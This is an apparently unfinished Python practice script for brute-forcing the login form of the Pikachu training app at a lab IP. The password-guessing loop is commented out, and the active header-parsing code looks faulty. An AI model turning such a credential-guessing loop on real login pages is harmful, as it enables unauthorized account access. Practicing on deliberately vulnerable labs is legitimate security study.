# conding=utf-8
import requests
import sys


def password_crack(url, username):
    # f = open("password.txt", "r")
    # pwds = f.readlines()
    # headers = {
    #     'Host': '10.16.53.180',
    #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    #     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    #     'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    #     'Accept-Encoding': 'gzip, deflate',
    #     'Content-Type': 'application/x-www-form-urlencoded',
    #     'Content-Length': '38',
    #     'Origin': 'http://10.16.53.180',
    #     'Connection': 'close',
    #     'Referer': 'http://10.16.53.180/pikachu/vul/burteforce/bf_form.php',
    #     'Cookie': 'PHPSESSID=1g0kj04uc3ahskoaubeqpgud56',
    #     'Upgrade-Insecure-Requests': '1',
    # }
    header = """
    Host: 10.16.53.180
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 38
    Origin: http://10.16.53.180
    Connection: close
    Referer: http://10.16.53.180/pikachu/vul/burteforce/bf_form.php
    Cookie: PHPSESSID=1g0kj04uc3ahskoaubeqpgud56
    Upgrade-Insecure-Requests: 1
    """
    y = dict(line.split(": ", 1) for line in header.split("\n") if line != '')
    print(y)
    # for pwd in pwds:
    #     url = url+'/post'
    #     # hengers需要字典格式
    #     values = {
    #         'username':username,
    #         'password':pwd[0:-1],
    #         'submit':'Login',
    #     }
    #     req = requests.post(url=url, headers=headers, data=values)
    #     print(len(req.text))


password_crack(sys.argv[1], sys.argv[2])

